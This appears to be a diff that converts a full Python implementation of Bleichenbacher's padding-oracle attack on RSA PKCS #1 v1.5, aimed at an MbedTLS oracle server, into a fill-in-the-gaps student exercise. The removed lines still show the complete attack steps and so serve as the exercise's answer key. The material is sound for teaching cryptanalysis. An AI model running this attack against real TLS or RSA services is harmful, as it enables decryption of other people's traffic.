@@ -1,15 +1,14 @@
 """
 Chosen-ciphertext attack on PKCS #1 v1.5
 http://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
+
+Missing parts that need to be completed are marked by ## ??? ##.
 """
 from oracles import MbedTLS_Oracle
 from attack_args import parse_args, read_pubkey
 from PKCS_1_5 import parse
 import os
 
-
-verbosity = 0
-total_queries = 0
 
 def egcd(a, b):
     """
@@ -81,12 +80,6 @@ def merge_intervals(intervals):
     return merged
 
 
-def one_query(oracle, content):
-    oracle.add_query(None, content)
-    _, result = oracle.wait_query()
-    return result
-
-
 def blinding(k, key, c, oracle):
     """
     Step 1 of the attack
@@ -96,38 +89,15 @@ def blinding(k, key, c, oracle):
     :param oracle: oracle that checks ciphertext conformity
     :return: integers s_0, c_0 s.t. c_0 represents a conforming encryption and c_0 = (c * (s_0) ** e) mod n
     """
-    global total_queries
-    if verbosity > 0:
-        total_queries += 1
-    if one_query(oracle, c.to_bytes(k, byteorder='big')):
+    if oracle.query(c.to_bytes(k, byteorder='big')):
         return 1, c
     while True:
         s_0 = os.urandom(k)
         s_0 = int.from_bytes(s_0, byteorder='big') % key.n
-        # Check if c_0 as defined in the attack conforms and return it if it does.
-        c_0 = (c * pow(s_0, key.e, key.n)) % key.n
-        if verbosity > 0:
-            total_queries += 1
-        if one_query(oracle, c_0.to_bytes(k, byteorder='big')):
-            return s_0, c_0
+        ## ??? ##
 
 
-def s_c_conform(key, c, s, oracle, k, num_queries=None):
-    global total_queries
-    if num_queries is None:
-        num_queries = len(oracle)
-    if verbosity > 0:
-        total_queries += num_queries
-    for i in range(num_queries):
-        oracle.add_query(i, ((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big'))
-    retval = -1
-    for _ in range(num_queries):
-        i, result = oracle.wait_query()
-        if result and retval == -1:
-            retval = s + i
-    return retval
-
-def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
+def find_min_conforming(key, c_0, min_s, oracle, k):
     """
     Step 2.a and 2.b of the attack
     :param key: RSA key
@@ -136,20 +106,10 @@ def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
     :param oracle: oracle that checks ciphertext conformity
     :return: smallest s >= min_s s.t. (c_0 * (s ** e)) mod n represents a conforming ciphertext
     """
-    # k may be given as an argument, but as we added this argument ourselves, we want to make sure
-    #      that the function can be called without it, in which case we use the global variable k
-    if k_arg is None:
-        k_arg = k
-    # Find the minimal s_i >= min_s such that the expression defined in the attack conforms.
-    s_i = min_s
-    while True:
-        res = s_c_conform(key, c_0, s_i, oracle, k_arg)
-        if res != -1:
-            return res
-        s_i += len(oracle)
+    pass  ## ??? ##
+    
 
-
-def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k_arg=None):
+def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k):
     """
     Step 2.c of the attack
     :param key: RSA key
@@ -161,22 +121,7 @@ def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k_arg=None):
     :param oracle: oracle that checks ciphertext conformity
     :return: s s.t. (c_0 * (s ** e)) mod n represents a conforming ciphertext
     """
-    if k_arg is None:
-        k_arg = k
-    start_r = divceil(2 * (b * prev_s - 2 * B), key.n)
-    r_i = start_r
-    while True:
-        start_s = divceil(2 * B + r_i * key.n, b)
-        end_s = divfloor(3 * B + r_i * key.n, a) + 1
-        # if end_s is an integer (i.e. a divides the dividend), we don't want to include it.
-        end_s -= int(egcd(3 * B + r_i * key.n, a) == a)
-        s_i = start_s
-        while s_i < end_s:
-            res = s_c_conform(key, c_0, s_i, oracle, k_arg)
-            if res != -1:
-                return res
-            s_i += len(oracle)
-        r_i += 1
+    pass  ## ??? ##
 
 
 def narrow_m(key, m_prev, s, B):
@@ -190,11 +135,11 @@ def narrow_m(key, m_prev, s, B):
     """
     intervals = []
     for a, b in m_prev:
-        min_r = divceil(a * s - 3 * B + 1, key.n)
-        max_r = divfloor(b * s - 2 * B, key.n)
+        min_r = None  ## ??? ##
+        max_r = None  ## ??? ##
         for r in range(min_r, max_r + 1):
-            start = max(a, divceil(2 * B + r * key.n, s))
-            end = min(b, divfloor(3 * B - 1 + r * key.n, s))
+            start = None  ## ??? ##
+            end = None  ## ??? ##
             intervals.append((start, end))
 
     return merge_intervals(intervals)
@@ -220,23 +165,20 @@ def bleichenbacher_attack(k, key, c, oracle):
 
     i = 1
     while True:
-        if verbosity > 0:
-            print("Round ", i, " (total queries %d)" % total_queries)
-        else:
-            print("Round ", i)
+        print("Round ", i)
         if i == 1:
-            s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracle, k_arg=k)
+            s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracle, k)
         elif len(m) > 1:
-            s = find_min_conforming(key, c_0, s + 1, oracle, k_arg=k)
+            s = find_min_conforming(key, c_0, s + 1, oracle, k)
         else:
             a = m[0][0]
             b = m[0][1]
-            s = search_single_interval(key, B, s, a, b, c_0, oracle, k_arg=k)
+            s = search_single_interval(key, B, s, a, b, c_0, oracle, k)
 
         m = narrow_m(key, m, s, B)
 
         if len(m) == 1 and m[0][0] == m[0][1]:
-            result = (m[0][0] * modinv(s_0, key.n)) % key.n
+            result = None  ## ??? ##
             break
         i += 1
 
@@ -246,21 +188,17 @@ def bleichenbacher_attack(k, key, c, oracle):
     else:
         return None
 
-if __name__ == "__main__":
+
+def main():
     args = parse_args()
-    verbosity = args.verbose
     k = int(args.n_length / 8)
     with open(args.public_key, "rb") as keyfile:
         pub_key = read_pubkey(keyfile, k)
 
-    oracle = MbedTLS_Oracle(addr=args.server_addr, port=args.server_port, stage=args.stage,
-                            num_servers=args.num_servers)
+    oracle = MbedTLS_Oracle(addr=args.server_addr, port=args.server_port)
 
-    if args.given_enc is not None:
-        with open(args.given_enc, "rb") as f:
-            c = f.read()
-    else:
-        c = b'\x00' + (k - 1) * bytes([1])
+    with open(args.given_enc, "rb") as f:
+        c = f.read()
 
     result = bleichenbacher_attack(k, pub_key, c, oracle)
     print(result)
@@ -268,3 +206,6 @@ if __name__ == "__main__":
         print("Unpadded:")
         print(parse(result).hex())
 
+
+if __name__ == "__main__":
+    main()
